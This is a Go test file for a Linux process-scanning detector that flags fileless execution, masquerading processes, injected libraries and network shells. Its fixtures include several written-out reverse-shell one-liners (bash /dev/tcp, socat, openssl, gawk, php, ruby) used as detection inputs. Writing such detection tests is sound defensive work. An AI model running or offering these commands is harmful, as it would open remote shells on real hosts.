package procscan

import (
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"testing"
)

func scoreHas(p Process, class string) bool {
	for _, f := range p.Findings {
		if f.Class == class {
			return true
		}
	}
	return false
}

func TestDetectMemfdFileless(t *testing.T) {
	p := detect(rawProc{pid: 101, comm: "x", exeTarget: "/memfd:payload (deleted)"}, DefaultThreshold)
	if p.Score < DefaultThreshold || !scoreHas(p, "procscan.fileless.memfd") {
		t.Fatalf("expected memfd fileless detection, got %+v", p)
	}
}

func TestDetectDeletedExe(t *testing.T) {
	p := detect(rawProc{pid: 102, comm: "svc", exeTarget: "/usr/bin/svc (deleted)"}, DefaultThreshold)
	if !scoreHas(p, "procscan.fileless.deleted") {
		t.Fatalf("expected deleted-exe detection, got %+v", p)
	}
}

func TestDetectMasqueradeBtop(t *testing.T) {
	// A process calling itself btop but running out of /tmp.
	p := detect(rawProc{pid: 103, comm: "btop", argv0: "btop", exeTarget: "/tmp/.x/btop"}, DefaultThreshold)
	if !scoreHas(p, "procscan.masquerade.name-location") {
		t.Fatalf("expected btop masquerade detection, got %+v", p)
	}
}

func TestDetectKthreadMasquerade(t *testing.T) {
	p := detect(rawProc{pid: 104, comm: "[kworker/0:1]", exeTarget: "/tmp/miner"}, DefaultThreshold)
	if !scoreHas(p, "procscan.masquerade.kthread") {
		t.Fatalf("expected kthread masquerade detection, got %+v", p)
	}
}

func TestDetectInjectedLibrary(t *testing.T) {
	p := detect(rawProc{pid: 105, comm: "app", exeTarget: "/usr/bin/app", libs: []string{"/usr/lib/libc.so.6", "/dev/shm/evil.so"}}, DefaultThreshold)
	if !scoreHas(p, "procscan.hook.injected-library") {
		t.Fatalf("expected injected-library detection, got %+v", p)
	}
}

func TestDetectLDPreload(t *testing.T) {
	p := detect(rawProc{pid: 106, comm: "app", exeTarget: "/usr/bin/app", preload: "/tmp/hook.so"}, DefaultThreshold)
	if !scoreHas(p, "procscan.hook.ld-preload") {
		t.Fatalf("expected ld-preload detection, got %+v", p)
	}
}

func TestDetectReverseShellCmdline(t *testing.T) {
	p := detect(rawProc{pid: 107, comm: "bash", exeTarget: "/usr/bin/bash",
		cmdline: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"}, DefaultThreshold)
	if !scoreHas(p, "procscan.cmdline.reverse-shell") {
		t.Fatalf("expected reverse-shell cmdline detection, got %+v", p)
	}
}

func TestDetectBenignProcessClean(t *testing.T) {
	p := detect(rawProc{pid: 108, comm: "nginx", argv0: "nginx: worker", exeTarget: "/usr/sbin/nginx",
		libs: []string{"/usr/lib/x86_64-linux-gnu/libssl.so.3"}, cmdline: "nginx: worker process"}, DefaultThreshold)
	if p.Score >= DefaultThreshold {
		t.Fatalf("benign nginx should not be flagged, got score=%d findings=%+v", p.Score, p.Findings)
	}
}

func TestScanOverFixtureProcRoot(t *testing.T) {
	// Build a fake /proc with one malicious process.
	root := t.TempDir()
	pid := filepath.Join(root, "4242")
	if err := os.MkdirAll(pid, 0o755); err != nil {
		t.Fatal(err)
	}
	write := func(name, content string) {
		if err := os.WriteFile(filepath.Join(pid, name), []byte(content), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	write("comm", "sshd\n")
	write("cmdline", "sshd\x00-D\x00")
	write("maps", "00400000-00452000 r-xp 00000000 08:01 1049 /dev/shm/implant.so\n")
	write("status", "Name:\tsshd\nPPid:\t1\nTracerPid:\t0\n")
	// exe symlink → a non-system path (masquerade); Readlink needs a real symlink.
	_ = os.Symlink("/tmp/sshd", filepath.Join(pid, "exe"))
	// a non-pid entry that must be ignored
	_ = os.WriteFile(filepath.Join(root, "cpuinfo"), []byte("x"), 0o644)

	res := Scan(Options{ProcRoot: root})
	if res.Scanned != 1 {
		t.Fatalf("expected 1 scanned process, got %d", res.Scanned)
	}
	if len(res.Flagged) != 1 {
		t.Fatalf("expected 1 flagged process, got %d (%+v)", len(res.Flagged), res.Flagged)
	}
	if res.Flagged[0].PID != 4242 {
		t.Fatalf("unexpected pid %d", res.Flagged[0].PID)
	}
}

func TestDetectSocketShell(t *testing.T) {
	rp := rawProc{comm: "bash", exeTarget: "/usr/bin/bash", cmdline: "bash", stdioPeer: "192.0.2.1:4444"}
	p := detect(rp, DefaultThreshold)
	if !scoreHas(p, "procscan.netshell.socket-stdio") || p.Score < DefaultThreshold {
		t.Fatalf("a shell on a TCP socket must flag, got %+v", p)
	}
}

// A non-interpreter on a socket is a network service, not a shell.
func TestDetectSocketServiceNotShell(t *testing.T) {
	rp := rawProc{comm: "nginx", exeTarget: "/usr/sbin/nginx", stdioPeer: "192.0.2.1:443"}
	if p := detect(rp, DefaultThreshold); scoreHas(p, "procscan.netshell.socket-stdio") {
		t.Fatalf("service flagged as shell: %+v", p)
	}
}

func TestIsInterpreterVersionSuffix(t *testing.T) {
	for comm, want := range map[string]bool{"python3": true, "python3.13": true, "perl5.40": true, "bash": true, "kwin_wayland": false, "nginx": false} {
		if got := isInterpreter(comm); got != want {
			t.Errorf("isInterpreter(%q) = %v, want %v", comm, got, want)
		}
	}
}

func TestAnonRWXIsContextOnly(t *testing.T) {
	p := detect(rawProc{comm: "node", exeTarget: "/usr/bin/node", anonRWX: 4}, DefaultThreshold)
	if !scoreHas(p, "procscan.inject.anon-rwx") || p.Score >= DefaultThreshold {
		t.Fatalf("anon rwx must be sub-threshold context, got %+v", p)
	}
}

func TestParseTCPLine(t *testing.T) {
	established := "   5: 0100007F:A0B4 0200A8C0:115C 01 00000000:00000000 00:00000000 00000000  1000        0 98765 1 0000 20 4"
	inode, peer := parseTCPLine(established)
	if inode != "98765" || peer != "192.168.0.2:4444" {
		t.Fatalf("got inode %q peer %q", inode, peer)
	}
	listen := "   1: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 11111 1 0000 100 0"
	if inode, _ := parseTCPLine(listen); inode != "" {
		t.Fatalf("a listener is not a connection: inode %q", inode)
	}
}

// fakeProc builds /proc/<pid> with stdin and stdout linked to the targets.
func fakeProc(t *testing.T, root string, pid, comm, fdTarget, tcp string) {
	t.Helper()
	base := filepath.Join(root, pid)
	for _, d := range []string{"fd", "net"} {
		if err := os.MkdirAll(filepath.Join(base, d), 0o755); err != nil {
			t.Fatal(err)
		}
	}
	files := map[string]string{"comm": comm + "\n", "status": "PPid:\t1\nTracerPid:\t0\n", "net/tcp": tcp}
	for name, body := range files {
		if err := os.WriteFile(filepath.Join(base, name), []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	for _, fd := range []string{"0", "1"} {
		if err := os.Symlink(fdTarget, filepath.Join(base, "fd", fd)); err != nil {
			t.Fatal(err)
		}
	}
	if err := os.Symlink("/usr/bin/"+comm, filepath.Join(base, "exe")); err != nil {
		t.Fatal(err)
	}
}

const tcpHeader = "  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode\n"

// The AF_UNIX case is the false positive a naive "socket:[n]" check has: a tool
// harness running sh over a socketpair looks identical until the inode resolves.
func TestScanSocketShellResolvesInode(t *testing.T) {
	root := t.TempDir()
	row := "   0: 0100007F:A0B4 0200A8C0:115C 01 00000000:00000000 00:00000000 00000000  1000        0 777 1 0000 20 4\n"
	fakeProc(t, root, "100", "bash", "socket:[777]", tcpHeader+row)
	fakeProc(t, root, "101", "sh", "socket:[888]", tcpHeader+row) // unix socketpair: inode not in tcp
	res := Scan(Options{ProcRoot: root})
	if len(res.Flagged) != 1 || res.Flagged[0].PID != 100 {
		t.Fatalf("want only pid 100 flagged, got %+v", res.Flagged)
	}
}

func TestConfirmedExcludesDeletedExe(t *testing.T) {
	// An upgrade leaves a running program's exe deleted. It flags; it must not
	// be acted on without a human.
	upgraded := detect(rawProc{comm: "kilo", exeTarget: "/opt/kilo (deleted)"}, DefaultThreshold)
	if upgraded.Score < DefaultThreshold {
		t.Fatalf("fixture must be flagged, got %+v", upgraded)
	}
	if Confirmed(upgraded, 0) {
		t.Fatalf("a deleted exe alone must not be confirmed: %+v", upgraded)
	}
	shell := detect(rawProc{comm: "bash", exeTarget: "/usr/bin/bash", stdioPeer: "192.0.2.1:4444"}, DefaultThreshold)
	if !Confirmed(shell, 0) {
		t.Fatalf("a network shell must be confirmed: %+v", shell)
	}
	stacked := Process{Score: DefaultRespondScore, Findings: []Finding{{Class: "procscan.hook.ld-preload", Score: 7}}}
	if !Confirmed(stacked, 0) {
		t.Fatal("a combined score at the bar must be confirmed")
	}
}

func TestRespondGuards(t *testing.T) {
	root := t.TempDir()
	write := func(pid, comm, status string) {
		base := filepath.Join(root, pid)
		if err := os.MkdirAll(base, 0o755); err != nil {
			t.Fatal(err)
		}
		_ = os.WriteFile(filepath.Join(base, "comm"), []byte(comm+"\n"), 0o644)
		_ = os.WriteFile(filepath.Join(base, "status"), []byte(status), 0o644)
		_ = os.Symlink("/x/"+comm, filepath.Join(base, "exe"))
	}
	self := os.Getpid()
	write(strconv.Itoa(self), "self", "PPid:\t500\n")
	write("500", "parent", "PPid:\t1\n")
	write("600", "implant", "PPid:\t1\n")
	write("700", "upgraded", "PPid:\t1\n")

	conclusive := []Finding{{Class: "procscan.netshell.socket-stdio", Score: 9}}
	res := &Result{Flagged: []Process{
		{PID: 1, Comm: "init", Findings: conclusive},
		{PID: self, Comm: "self", Exe: "/x/self", Findings: conclusive},
		{PID: 500, Comm: "parent", Exe: "/x/parent", Findings: conclusive},
		{PID: 600, Comm: "implant", Exe: "/x/implant", Findings: conclusive},
		{PID: 600, Comm: "reused", Exe: "/x/reused", Findings: conclusive}, // identity changed
		{PID: 700, Comm: "upgraded", Exe: "/x/upgraded", Score: 9, Findings: []Finding{{Class: "procscan.fileless.deleted", Score: 9}}},
	}}
	var hit []int
	rs := Respond(res, RespondOptions{Action: ActionStop, ProcRoot: root,
		signal: func(pid int, _ Action) error { hit = append(hit, pid); return nil }})
	if len(hit) != 1 || hit[0] != 600 {
		t.Fatalf("only the confirmed, unprotected, unchanged pid may be signalled, got %v (%+v)", hit, rs)
	}
	if len(rs) != len(res.Flagged) {
		t.Fatalf("every flagged process needs a response record, got %d", len(rs))
	}
}

// Text in argv proves nothing unless an interpreter is the one holding it.
func TestConfirmedCmdlineNeedsInterpreter(t *testing.T) {
	text := []Finding{{Class: "procscan.cmdline.reverse-shell", Score: 9}}
	if Confirmed(Process{Comm: "grep", Score: 9, Findings: text}, 0) {
		t.Fatal("grep over reverse-shell text must not be confirmed")
	}
	if !Confirmed(Process{Comm: "sh", Score: 9, Findings: text}, 0) {
		t.Fatal("an interpreter running a reverse-shell command must be confirmed")
	}
}

// Two recognisers agreeing on argv text must not add up to a confirmed process.
func TestCmdlineFindingsCountOnce(t *testing.T) {
	note := detect(rawProc{comm: "grep", exeTarget: "/usr/bin/grep",
		cmdline: `grep bash -i >& /dev/tcp/192.0.2.1/443 0>&1 notes.txt`}, DefaultThreshold)
	if note.Score >= DefaultRespondScore {
		t.Fatalf("argv text scored as confirmed: %+v", note)
	}
	if Confirmed(note, 0) {
		t.Fatalf("grep over a note must not be confirmed: %+v", note)
	}
}

func TestCmdlineCoversRevshellVocabulary(t *testing.T) {
	for comm, cmd := range map[string]string{
		"socat": `socat TCP:192.0.2.1:443 EXEC:/bin/sh`,
		"sh":    `/bin/sh -i 2>&1 | openssl s_client -quiet -connect 192.0.2.1:443 > /tmp/s`,
		"gawk":  `gawk BEGIN { s = "/inet/tcp/0/192.0.2.1/443"; printf "x" |& s }`,
		"php":   `php -r $s=fsockopen("192.0.2.1",443);proc_open("/bin/sh",[$s,$s,$s],$p);`,
		"ruby":  `ruby -rsocket -e spawn("sh",[:in,:out,:err]=>TCPSocket.new("192.0.2.1",443))`,
	} {
		p := detect(rawProc{comm: comm, exeTarget: "/usr/bin/" + comm, cmdline: cmd}, DefaultThreshold)
		if p.Score < DefaultThreshold {
			t.Errorf("%s: %q not flagged: %+v", comm, cmd, p)
		}
	}
}

func TestSetuidShell(t *testing.T) {
	p := detect(rawProc{comm: "bash", exeTarget: "/tmp/.b", hasUID: true, ruid: 1000, euid: 0}, DefaultThreshold)
	if !scoreHas(p, "procscan.privesc.setuid-shell") || !Confirmed(p, 0) {
		t.Fatalf("got %+v", p)
	}
	// sudo sets the real uid too, so this is an ordinary root shell.
	if p := detect(rawProc{comm: "bash", exeTarget: "/usr/bin/bash", hasUID: true}, DefaultThreshold); scoreHas(p, "procscan.privesc.setuid-shell") {
		t.Fatalf("got %+v", p)
	}
	// A set-uid helper that is not an interpreter is what set-uid is for.
	if p := detect(rawProc{comm: "passwd", exeTarget: "/usr/bin/passwd", hasUID: true, ruid: 1000}, DefaultThreshold); scoreHas(p, "procscan.privesc.setuid-shell") {
		t.Fatalf("got %+v", p)
	}
}

func relayProc(t *testing.T, root, pid, comm, in, out, tcp string) {
	t.Helper()
	base := filepath.Join(root, pid)
	for _, d := range []string{"fd", "net"} {
		if err := os.MkdirAll(filepath.Join(base, d), 0o755); err != nil {
			t.Fatal(err)
		}
	}
	for name, body := range map[string]string{"comm": comm + "\n", "status": "PPid:\t1\n", "net/tcp": tcp} {
		if err := os.WriteFile(filepath.Join(base, name), []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	_ = os.Symlink(in, filepath.Join(base, "fd", "0"))
	_ = os.Symlink(out, filepath.Join(base, "fd", "1"))
	_ = os.Symlink("/usr/bin/"+comm, filepath.Join(base, "exe"))
}

func TestMarkPipeRelays(t *testing.T) {
	root := t.TempDir()
	row := "   0: 0100007F:A0B4 0200A8C0:115C 01 00000000:00000000 00:00000000 00000000  1000        0 777 1 0000 20 4\n"
	relayProc(t, root, "20", "nc", "pipe:[500]", "/tmp/f", tcpHeader+row)
	_ = os.Symlink("socket:[777]", filepath.Join(root, "20", "fd", "3"))
	relayProc(t, root, "21", "nc", "pipe:[600]", "/tmp/f", tcpHeader) // no live connection

	procs := []rawProc{
		{pid: 20, comm: "nc", stdin: "pipe:[500]"},
		{pid: 21, comm: "nc", stdin: "pipe:[600]"},
		{pid: 30, comm: "sh", stdinFIFO: true, stdout: "pipe:[500]"},   // the relay
		{pid: 31, comm: "sh", stdinFIFO: false, stdout: "pipe:[500]"},  // ./report.sh | nc
		{pid: 32, comm: "sh", stdinFIFO: true, stdout: "/dev/pts/0"},   // curl x | sh
		{pid: 33, comm: "sh", stdinFIFO: true, stdout: "pipe:[600]"},   // tool has no connection
		{pid: 34, comm: "grep", stdinFIFO: true, stdout: "pipe:[500]"}, // not an interpreter
	}
	markPipeRelays(root, procs)
	for i, want := range map[int]bool{2: true, 3: false, 4: false, 5: false, 6: false} {
		if got := procs[i].pipeRelay != ""; got != want {
			t.Errorf("pid %d: relay=%v, want %v", procs[i].pid, got, want)
		}
	}
}

// Blocking /bin/bash because a reverse shell runs it would take the host down.
func TestBlockExeRefusesWhatTheHostRuns(t *testing.T) {
	root := t.TempDir()
	for _, c := range []struct {
		exe  string
		want bool
	}{
		{"/usr/bin/bash", false}, {"/bin/sh", false}, {"/usr/sbin/sshd", false},
		{"/opt/app/python3", false}, // an interpreter wherever it lives
		{"/tmp/.x/implant", true}, {"/dev/shm/m (deleted)", true},
	} {
		called := ""
		blocked, _ := blockExe(root, Process{PID: 9, Exe: c.exe}, func(p string) error { called = p; return nil })
		if (blocked != "") != c.want || (called != "") != c.want {
			t.Errorf("%s: blocked=%q called=%q, want block=%v", c.exe, blocked, called, c.want)
		}
	}
}

func TestKernelEventsNeedIdentity(t *testing.T) {
	res := &Result{}
	idx := indexKernelEvents([]KernelEvent{
		{TGID: 50, Reason: "netshell", Comm: "nc", Exe: "sh", Denied: true, Peer: "192.0.2.1:443"},
		{TGID: 60, Reason: "netshell", Comm: "nc", Exe: "sh"},
	}, res)
	if res.KernelSeen != 2 || res.KernelRefused != 1 {
		t.Fatalf("counts: %+v", res)
	}
	// A refused exec leaves the original program running.
	if got := idx.findings(rawProc{pid: 50, comm: "nc", exeTarget: "/usr/bin/nc"}); len(got) != 1 || got[0].Class != "procscan.kernel.netshell" {
		t.Fatalf("got %+v", got)
	}
	// PID 60 now belongs to something else entirely.
	if got := idx.findings(rawProc{pid: 60, comm: "cron", exeTarget: "/usr/sbin/cron"}); len(got) != 0 {
		t.Fatalf("a reused PID matched: %+v", got)
	}
}

func TestLoadKernelEvents(t *testing.T) {
	if got, err := LoadKernelEvents(filepath.Join(t.TempDir(), "absent")); got != nil || err != nil {
		t.Fatalf("a missing log means no guard, not an error: %v %v", got, err)
	}
	p := filepath.Join(t.TempDir(), "log")
	body := `{"pid":1,"tgid":1,"reason":"netshell"}` + "\n" + `{"pid":2,"tg` + "\n" + `{"pid":3,"tgid":3,"reason":"memfd-exec"}` + "\n"
	if err := os.WriteFile(p, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	got, err := LoadKernelEvents(p)
	if err != nil || len(got) != 2 {
		t.Fatalf("a torn line must be skipped: %+v %v", got, err)
	}
}

// realGuardEvent was written by cau-kernel's guard on a real kernel, in the QEMU
// test. The two projects share this line format and nothing else, so it is pinned.
//
// It carries the process's start time (start_ticks) and the thread that called
// execve (tid): with the start time the engine can match an event to the
// process it happened to, and a finding can carry a response.
const realGuardEvent = `{"pid":184,"tid":184,"tgid":184,"uid":0,"reason":"netshell","denied":true,` +
	`"peer":"127.0.0.1:54286","comm":"init","exe":"sh","start_ticks":284,"time":"2026-11-10T21:39:27.865614716Z"}`

func TestKernelEventContract(t *testing.T) {
	p := filepath.Join(t.TempDir(), "log")
	if err := os.WriteFile(p, []byte(realGuardEvent+"\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	got, err := LoadKernelEvents(p)
	if err != nil || len(got) != 1 {
		t.Fatalf("%+v %v", got, err)
	}
	e := got[0]
	if e.TGID == 0 || e.Reason != "netshell" || !e.Denied || e.Peer == "" || e.Exe != "sh" {
		t.Fatalf("the guard's line no longer parses: %+v", e)
	}
	// The identity the engine matches on, and the time it reports.
	if !e.Identity() || e.StartTicks == 0 {
		t.Fatalf("the guard's line carries no process start time: %+v", e)
	}
	if e.Time.IsZero() {
		t.Fatalf("the guard's line carries no time: %+v", e)
	}
	// "pid" is the process an operator looks up, "tid" the thread that exec'd.
	if e.PID != e.TGID || e.TID != e.PID {
		t.Fatalf("pid/tgid/tid disagree: %+v", e)
	}
}

// An event that names the process it happened to is an attribution and can
// carry a response; one without a start time is context about the PID and
// cannot. This is the whole point of the start_ticks field the guard records.
func TestKernelEventWithIdentityIsActionable(t *testing.T) {
	res := &Result{}
	idx := indexKernelEvents([]KernelEvent{
		{TGID: 50, Reason: "netshell", Comm: "nc", Exe: "sh", Denied: true, Peer: "192.0.2.1:443", StartTicks: 1234},
	}, res)
	got := idx.findings(rawProc{pid: 50, comm: "nc", exeTarget: "/usr/bin/nc", startTicks: 1234})
	if len(got) != 1 {
		t.Fatalf("the event did not match the process it named: %+v", got)
	}
	if got[0].Score == 0 {
		t.Fatalf("an event with a start time is context, not evidence: %+v", got[0])
	}
	// The same event about a process that has since let go of the PID.
	if got := idx.findings(rawProc{pid: 50, comm: "nc", exeTarget: "/usr/bin/nc", startTicks: 999}); len(got) != 0 {
		t.Fatalf("a reused PID matched: %+v", got)
	}
	// A process that renamed itself after the exec is still the same process:
	// the start time has already settled it.
	if got := idx.findings(rawProc{pid: 50, comm: "evil", exeTarget: "/usr/bin/nc", startTicks: 1234}); len(got) != 1 {
		t.Fatalf("a renamed process did not match its own event: %+v", got)
	}
}

// A log with one over-long line must not cost every event after it.
func TestLoadKernelEventsSurvivesALongLine(t *testing.T) {
	p := filepath.Join(t.TempDir(), "log")
	long := `{"pid":1,"tgid":1,"reason":"netshell","peer":"` + strings.Repeat("x", 2<<20) + `"}`
	body := long + "\n" + `{"pid":3,"tgid":3,"reason":"memfd-exec"}` + "\n"
	if err := os.WriteFile(p, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	got, err := LoadKernelEvents(p)
	if err != nil {
		t.Fatalf("%v", err)
	}
	if len(got) != 1 || got[0].Reason != "memfd-exec" {
		t.Fatalf("the events after a long line were lost: %+v", got)
	}
}
